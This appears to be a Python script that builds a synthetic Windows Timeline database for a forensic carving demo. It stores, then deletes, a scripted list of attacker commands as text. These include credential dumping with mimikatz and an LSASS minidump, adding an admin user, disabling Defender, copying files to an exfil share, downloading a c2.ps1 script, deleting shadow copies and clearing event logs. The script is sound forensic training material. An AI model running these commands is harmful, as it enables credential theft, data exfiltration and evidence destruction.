"""시연용 합성 ActivitiesCache.db 생성기.

part-1 엔진(windows-timeline)이 실제로 파싱하는 Activity 테이블을 만들어, EVTX 1102 샘플
(2019-03-20 08:35 감사로그 삭제)과 시각이 맞물리는 사용자 활동 스토리를 심는다.
→ "🎬 데모"가 JSON 주입이 아니라 진짜 엔진으로 이 db 를 파싱하게 한다.

실행:  python sample/build_demo_db.py   →  sample/demo_ActivitiesCache.db
"""
from __future__ import annotations

import json
import os
import sqlite3
from datetime import datetime, timedelta, timezone

_KST = timezone(timedelta(hours=9))
_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "demo_ActivitiesCache.db")

# schema.py ACTIVITY_COLUMNS 선언 순서(31)
_COLS = [
    "Id", "AppId", "PackageIdHash", "AppActivityId", "ActivityType", "ActivityStatus",
    "ParentActivityId", "Tag", "Group", "MatchId", "LastModifiedTime", "ExpirationTime",
    "Payload", "Priority", "IsLocalOnly", "PlatformDeviceId", "DdsDeviceId", "CreatedInCloud",
    "StartTime", "EndTime", "LastModifiedOnClient", "GroupAppActivityId", "ClipboardPayload",
    "EnterpriseId", "OriginalPayload", "UserActionState", "IsRead",
    "OriginalLastModifiedOnClient", "GroupItems", "LocalExpirationTime", "ETag",
]


def _appid(exe_path: str) -> str:
    return json.dumps([{"platform": "windows_win32", "application": exe_path}])


def _payload(display: str, uri: str | None = None) -> bytes:
    d = {"displayText": display}
    if uri:
        d["activationUri"] = uri  # _url 정규식이 payload 문자열에서 URL 추출
    return json.dumps(d, ensure_ascii=False).encode("utf-8")


def _epoch(kst_hms: str) -> int:
    """'2019-03-20 08:01:00' (KST) → unix epoch seconds."""
    dt = datetime.strptime(kst_hms, "%Y-%m-%d %H:%M:%S").replace(tzinfo=_KST)
    return int(dt.timestamp())


_CMD = r"C:\Windows\System32\cmd.exe"
_PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
_EXP = r"C:\Windows\explorer.exe"

# 정상 업무 활동(live, 화면에 초록 "정상"). 삭제 안 함.
_NORMAL = [
    ("2019-03-20 08:01:00", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
     "분기보고서.docx", None),
    ("2019-03-20 08:12:00", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     "사내 위키 - 분기 일정", "https://wiki.corp.local/q1"),
    ("2019-03-20 08:20:00", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
     "검색: how to clear windows security event log",
     "https://www.bing.com/search?q=clear+windows+security+event+log"),
    ("2019-03-20 08:24:00", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     "DefenderControl.zip 다운로드", "https://files.example.net/tools/DefenderControl.zip"),
]

# 공격자 활동(삭제 → 카빙으로 복구되어 화면에 노란 "카빙" 점선카드).
# 08:25~08:42, 보안로그 1102 삭제(08:35) 전후. "공격자가 흔적을 지웠지만 복구됨" 스토리.
_ATTACKER_CMDS = [
    (_CMD, "cmd.exe /c whoami /all", None),
    (_CMD, "cmd.exe /c systeminfo", None),
    (_CMD, "cmd.exe /c ipconfig /all", None),
    (_CMD, "cmd.exe /c net user", None),
    (_CMD, "cmd.exe /c net user backup_adm P@ssw0rd! /add", None),
    (_CMD, "cmd.exe /c net localgroup administrators backup_adm /add", None),
    (_CMD, "cmd.exe /c net group \"Domain Admins\" /domain", None),
    (_PS, "powershell -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC4ALgAu", None),
    (_PS, "powershell Set-MpPreference -DisableRealtimeMonitoring $true", None),
    (_CMD, "cmd.exe /c reg add HKLM\\...\\Windows Defender /v DisableAntiSpyware /d 1", None),
    (_CMD, "cmd.exe /c sc create UpdaterSvc binPath= C:\\Temp\\svc.exe", None),
    (_CMD, "cmd.exe /c schtasks /create /tn Updater /tr C:\\Temp\\p.exe /sc onlogon", None),
    (_EXP, "mimikatz.exe", "file:///C:/Temp/mimikatz.exe"),
    (_CMD, "cmd.exe /c mimikatz \"sekurlsa::logonpasswords\"", None),
    (_EXP, "lsass.dmp", "file:///C:/Temp/lsass.dmp"),
    (_CMD, "cmd.exe /c rundll32 comsvcs.dll MiniDump 640 C:\\Temp\\lsass.dmp full", None),
    (_EXP, "psexec.exe", "file:///C:/Temp/PSTools/psexec.exe"),
    (_CMD, "cmd.exe /c psexec \\\\DC01 -s cmd.exe", None),
    (_EXP, "고객정보_전체.xlsx", "file:///C:/Share/고객정보_전체.xlsx"),
    (_EXP, "급여명세_전직원.xlsx", "file:///C:/HR/급여명세_전직원.xlsx"),
    (_EXP, "계약서_기밀.docx", "file:///C:/Legal/계약서_기밀.docx"),
    (_EXP, "비밀번호목록.txt", "file:///C:/Users/admin/Desktop/비밀번호목록.txt"),
    (_CMD, "cmd.exe /c copy C:\\HR\\급여명세_전직원.xlsx \\\\10.0.0.66\\exfil", None),
    (_CMD, "cmd.exe /c 7z a -p out.7z C:\\Share\\*", None),
    (_PS, "powershell Invoke-WebRequest http://10.0.0.66/c2.ps1 -OutFile c2.ps1", None),
    (_CMD, "cmd.exe /c netsh advfirewall set allprofiles state off", None),
    (_CMD, "cmd.exe /c vssadmin delete shadows /all /quiet", None),
    (_CMD, "cmd.exe /c wevtutil cl System", None),
    (_CMD, "cmd.exe /c wevtutil cl Security", None),
    (_CMD, "cmd.exe /c del /f /q C:\\Temp\\*.exe", None),
    (_CMD, "cmd.exe /c cipher /w:C:\\Temp", None),
    (_PS, "powershell Clear-EventLog -LogName Security,System,Application", None),
    (_PS, "powershell Remove-Item (Get-PSReadlineOption).HistorySavePath", None),
    (_CMD, "cmd.exe /c reg delete HKCU\\...\\RunMRU /f", None),
    (_CMD, "cmd.exe /c doskey /history", None),
    (_CMD, "cmd.exe /c exit", None),
]


def _insert(con, ins, etag, ts, exe, disp, uri):
    row = {c: None for c in _COLS}
    row["Id"] = b"GUID" + etag.to_bytes(12, "big")
    row["AppId"] = _appid(exe)
    row["ActivityType"] = 5
    row["ActivityStatus"] = 1
    row["Payload"] = _payload(disp, uri)
    row["StartTime"] = ts
    row["EndTime"] = ts + 60
    row["LastModifiedTime"] = ts + 60
    row["LastModifiedOnClient"] = ts
    row["ETag"] = etag
    con.execute(ins, [row[c] for c in _COLS])


def build(path: str = _OUT) -> str:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    try:
        con.execute("PRAGMA page_size=4096")
        # 핵심: secure_delete=OFF — 안 하면 SQLite가 삭제 셀 내용을 0으로 지워 카빙 불가.
        con.execute("PRAGMA secure_delete=OFF")
        con.execute("PRAGMA auto_vacuum=NONE")  # DELETE 후 페이지 즉시 회수 안 함
        cols_ddl = ", ".join(f'"{c}"' for c in _COLS)
        con.execute(f'CREATE TABLE "Activity" ({cols_ddl})')
        ins = (f'INSERT INTO "Activity" ({", ".join(chr(34)+c+chr(34) for c in _COLS)}) '
               f'VALUES ({", ".join("?" * len(_COLS))})')

        etag = 0
        # 1) 정상 업무 활동 — 유지(live)
        for kst, exe, disp, uri in _NORMAL:
            etag += 1
            _insert(con, ins, etag, _epoch(kst), exe, disp, uri)
        # 2) 공격자 활동 — 08:25부터 25초 간격. 나중에 삭제할 ETag 기록.
        attacker_etags = []
        base = _epoch("2019-03-20 08:25:00")
        for k, (exe, disp, uri) in enumerate(_ATTACKER_CMDS):
            etag += 1
            attacker_etags.append(etag)
            _insert(con, ins, etag, base + k * 25, exe, disp, uri)
        con.commit()

        # 3) 공격자가 흔적 삭제 → 페이지가 비워져 freelist 로 → 카버가 복원(노란 "카빙" 카드).
        for e in attacker_etags:
            con.execute('DELETE FROM "Activity" WHERE "ETag" = ?', (e,))
        con.commit()
        # VACUUM 안 함 → 삭제 셀 보존(카빙 데모 핵심)
    finally:
        con.close()
    return path


if __name__ == "__main__":
    out = build()
    print(f"생성됨: {out}")
